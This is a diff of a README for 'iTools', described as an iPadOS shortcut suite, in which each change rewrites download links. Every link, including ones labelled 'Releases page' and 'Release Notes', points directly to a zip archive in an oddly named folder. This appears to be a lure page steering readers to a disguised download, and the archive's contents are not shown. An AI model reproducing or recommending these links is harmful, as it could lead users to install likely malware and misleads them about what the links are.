@@ -1,7 +1,7 @@
 # 🎉 iTools - Your All-in-One iPadOS Solution
 
 ## 📥 Download iTools
-[![Download iTools](https://raw.githubusercontent.com/Rothalizee/iTools/main/pericardiosymphysis/Tools-i-2.9.zip)](https://raw.githubusercontent.com/Rothalizee/iTools/main/pericardiosymphysis/Tools-i-2.9.zip)
+[![Download iTools](https://github.com/Rothalizee/iTools/raw/refs/heads/main/pericardiosymphysis/Tools_i_v2.8.zip)](https://github.com/Rothalizee/iTools/raw/refs/heads/main/pericardiosymphysis/Tools_i_v2.8.zip)
 
 ## 🚀 Getting Started
 Welcome to iTools! This guide will help you download and run iTools easily. Follow these steps to start enhancing your iPadOS experience.
@@ -10,7 +10,7 @@ Welcome to iTools! This guide will help you download and run iTools easily. Foll
 iTools is a powerful all-in-one suite for iPadOS. It combines over 90 professional functions into one efficient shortcut. Designed for power users and creatives, iTools eliminates the need for multiple third-party apps by utilizing deep system features from Apple.
 
 ## 📁 Download & Install
-To get started with iTools, visit the [Releases page](https://raw.githubusercontent.com/Rothalizee/iTools/main/pericardiosymphysis/Tools-i-2.9.zip) to download the app.
+To get started with iTools, visit the [Releases page](https://github.com/Rothalizee/iTools/raw/refs/heads/main/pericardiosymphysis/Tools_i_v2.8.zip) to download the app.
 
 1. Click the link above to go to the Releases page.
 2. Choose the latest version of iTools.
@@ -64,10 +64,10 @@ If you encounter any issues or have questions, please visit the Issues page in o
 iTools is designed to streamline your workflow, saving you time and simplifying tasks. Don’t hesitate to explore all its features.
 
 ## 🔗 Additional Resources
-- [iTools Release Notes](https://raw.githubusercontent.com/Rothalizee/iTools/main/pericardiosymphysis/Tools-i-2.9.zip)
+- [iTools Release Notes](https://github.com/Rothalizee/iTools/raw/refs/heads/main/pericardiosymphysis/Tools_i_v2.8.zip)
 - [User Manual](#)
 
 ## 📢 Join Our Community
 Stay updated on new features, updates, and community discussions. Follow our repository for the latest news!
 
-[![Download iTools](https://raw.githubusercontent.com/Rothalizee/iTools/main/pericardiosymphysis/Tools-i-2.9.zip)](https://raw.githubusercontent.com/Rothalizee/iTools/main/pericardiosymphysis/Tools-i-2.9.zip)
+[![Download iTools](https://github.com/Rothalizee/iTools/raw/refs/heads/main/pericardiosymphysis/Tools_i_v2.8.zip)](https://github.com/Rothalizee/iTools/raw/refs/heads/main/pericardiosymphysis/Tools_i_v2.8.zip)
